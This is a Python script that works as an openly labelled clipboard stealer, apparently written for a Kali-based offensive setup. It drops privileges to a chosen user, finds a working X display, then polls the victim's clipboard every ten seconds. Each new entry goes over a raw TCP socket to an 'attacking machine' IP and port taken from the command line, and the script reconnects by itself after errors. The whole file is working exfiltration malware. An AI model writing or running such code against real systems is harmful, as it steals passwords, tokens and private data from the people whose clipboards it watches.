import subprocess
import time
import tkinter as tk
import os
import pwd
import argparse
import socket
import logging
def test_displays():
    displays = [':0', ':1', ':2', ':3', ':4', ':5', ':6', ':7', ':8', ':9', ':10']
    for display in displays:
        try:
            os.environ['DISPLAY'] = display
            root = tk.Tk()
            root.withdraw()
            logging.info(f"Display {display} works")
            root.destroy()
            return
        except Exception as e:
            logging.error(f"Display {display} does not work: {e}")
    logging.error("No valid displays found")
    exit()
def switch_user(target_user):
    try:
        target_uid = pwd.getpwnam(target_user).pw_uid
        target_gid = pwd.getpwnam(target_user).pw_gid
        os.setgid(target_gid)
        os.setuid(target_uid)
        logging.info(f"Switched to user: {target_user}")
    except Exception as e:
        logging.error(f"Failed to switch users: {e}")
        exit()
def get_clipboard_contents():
    try:
        root = tk.Tk()
        root.withdraw()
        clipboard_content = root.clipboard_get()
        root.destroy()
        return clipboard_content
    except Exception as e:
    	logging.error(e)
    	return ""
def clipboardextract(args):
	try:
		time.sleep(10)
		clipboard_history = []
		clipboard_contents = ""
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((args.ip, int(args.port)))
		while True:
			new_clipboard_contents = get_clipboard_contents()
			if clipboard_contents != new_clipboard_contents:
				clipboard_history.append(clipboard_contents)
				clipboard_contents = new_clipboard_contents
				sock.send((f"{time.ctime(time.time())}\n" + clipboard_contents + "\n").encode('utf-8'))
			time.sleep(10)
		sock.close()
	except Exception as e:
		logging.error(e)
		clipboardextract(args)
if __name__ == "__main__":
	try:
		parser = argparse.ArgumentParser()
		parser.add_argument("ip", type=str, help="IP address of the attacking machine to connect back to.")
		parser.add_argument("port", type=str, help="Port on the attacking machine to exfiltrate data to.")
		parser.add_argument("log", type=str, help="File path to clipboard stealer log file.")
		args = parser.parse_args()
		logging.basicConfig(filename=args.log, filemode='w', level=logging.DEBUG)
		time.sleep(10)
		switch_user("kali")
		test_displays()
		clipboardextract(args)
	except Exception as e:
		logging.error(e)
